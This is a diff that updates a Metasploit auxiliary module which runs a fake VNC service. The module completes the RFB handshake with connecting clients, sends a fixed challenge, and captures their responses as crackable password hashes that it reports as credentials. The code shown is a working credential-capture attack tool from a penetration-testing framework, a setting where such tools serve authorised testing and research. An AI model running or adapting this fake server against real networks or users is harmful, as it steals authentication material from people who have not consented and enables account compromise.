@@ -1,35 +1,34 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::TcpServer
   include Msf::Auxiliary::Report
 
+  require 'metasploit/framework/hashes/identify'
+
   def initialize
     super(
-      'Name'           => 'Authentication Capture: VNC',
-      'Description'    => %q{
+      'Name' => 'Authentication Capture: VNC',
+      'Description' => %q{
         This module provides a fake VNC service that
       is designed to capture authentication credentials.
       },
-      'Author'         => 'Patrik Karlsson <patrik[at]cqure.net>',
-      'License'        => MSF_LICENSE,
-      'Actions'        => [ [ 'Capture' ] ],
+      'Author' => 'Patrik Karlsson <patrik[at]cqure.net>',
+      'License' => MSF_LICENSE,
+      'Actions' => [[ 'Capture', { 'Description' => 'Run VNC capture server' } ]],
       'PassiveActions' => [ 'Capture' ],
-      'DefaultAction'  => 'Capture'
+      'DefaultAction' => 'Capture'
     )
 
     register_options(
       [
-        OptPort.new('SRVPORT', [ true, "The local port to listen on.", 5900 ]),
-        OptString.new('CHALLENGE', [ true, "The 16 byte challenge", "00112233445566778899AABBCCDDEEFF" ]),
-        OptString.new('JOHNPWFILE',  [ false, "The prefix to the local filename to store the hashes in JOHN format", nil ])
-      ], self.class)
+        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 5900 ]),
+        OptString.new('CHALLENGE', [ true, 'The 16 byte challenge', '00112233445566778899AABBCCDDEEFF' ])
+      ]
+    )
   end
 
   def setup
@@ -39,23 +38,21 @@ class Metasploit3 < Msf::Auxiliary
 
   def run
     if datastore['CHALLENGE'].to_s =~ /^([a-fA-F0-9]{32})$/
-      @challenge = [ datastore['CHALLENGE'] ].pack("H*")
+      @challenge = [ datastore['CHALLENGE'] ].pack('H*')
     else
-      print_error("CHALLENGE syntax must match 00112233445566778899AABBCCDDEEFF")
-      return
+      fail_with(Failure::BadConfig, 'CHALLENGE must be 32 characters, 0-9,A-F.')
     end
-    print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
-    exploit()
+    exploit
   end
 
   def on_client_connect(c)
     @state[c] = {
-      :name    => "#{c.peerhost}:#{c.peerport}",
-      :ip      => c.peerhost,
-      :port    => c.peerport,
-      :pass    => nil,
-      :chall   => nil,
-      :proto   => nil
+      name: "#{c.peerhost}:#{c.peerport}",
+      ip: c.peerhost,
+      port: c.peerport,
+      pass: nil,
+      chall: nil,
+      proto: nil
     }
 
     c.put "RFB 003.007\n"
@@ -75,7 +72,8 @@ class Metasploit3 < Msf::Auxiliary
       module_fullname: fullname,
       username: opts[:user],
       private_data: opts[:password],
-      private_type: :nonreplayable_hash
+      private_type: :nonreplayable_hash,
+      jtr_format: identify_hash(opts[:password])
     }.merge(service_data)
 
     login_data = {
@@ -89,21 +87,21 @@ class Metasploit3 < Msf::Auxiliary
 
   def on_client_data(c)
     data = c.get_once
-    return if not data
+    return if !data
 
     peer = "#{c.peerhost}:#{c.peerport}"
 
     if data =~ /^RFB (.*)\n$/
-      @state[c][:proto] = $1
-      if @state[c][:proto] == "003.007"
+      @state[c][:proto] = Regexp.last_match(1)
+      if @state[c][:proto] == '003.007'
         # for the 003.007 protocol we say we support the VNC sectype
         # and wait for the server to acknowledge it, before we send the
         # challenge.
-        c.put [0x0102].pack("n") # 1 sectype, unencrypted
-      elsif @state[c][:proto] == "003.003"
+        c.put [0x0102].pack('n') # 1 sectype, unencrypted
+      elsif @state[c][:proto] == '003.003'
         # for the 003.003 protocol we say we support the VNC sectype
         # and immediately send the challenge
-        sectype = [0x00000002].pack("N")
+        sectype = [0x00000002].pack('N')
         c.put sectype
 
         @state[c][:chall] = @challenge
@@ -113,10 +111,10 @@ class Metasploit3 < Msf::Auxiliary
       end
     # the challenge was sent, so this should be our response
     elsif @state[c][:chall]
-      c.put [0x00000001].pack("N")
+      c.put [0x00000001].pack('N')
       c.close
-      print_status("#{peer} - Challenge: #{@challenge.unpack('H*')[0]}; Response: #{data.unpack('H*')[0]}")
-      hash_line = "$vnc$*#{@state[c][:chall].unpack("H*")[0]}*#{data.unpack('H*')[0]}"
+      print_good("#{peer} - Challenge: #{@challenge.unpack('H*')[0]}; Response: #{data.unpack('H*')[0]}")
+      hash_line = "*#{@state[c][:chall].unpack('H*')[0]}*#{data.unpack('H*')[0]}"
       report_cred(
         ip: c.peerhost,
         port: datastore['SRVPORT'],
@@ -126,15 +124,10 @@ class Metasploit3 < Msf::Auxiliary
         proof: hash_line
       )
 
-      if(datastore['JOHNPWFILE'])
-        fd = ::File.open(datastore['JOHNPWFILE'] + '_vnc' , "ab")
-        fd.puts hash_line
-        fd.close
-      end
     # we have got the protocol sorted out and have offered the VNC sectype (2)
-    elsif @state[c][:proto] == "003.007"
-      if ( data.unpack("C")[0] != 2 )
-        print_error("#{peer} - sectype not offered! #{data.unpack("H*")}")
+    elsif @state[c][:proto] == '003.007'
+      if (data.unpack('C')[0] != 2)
+        print_error("#{peer} - sectype not offered! #{data.unpack('H*')}")
         c.close
         return
       end
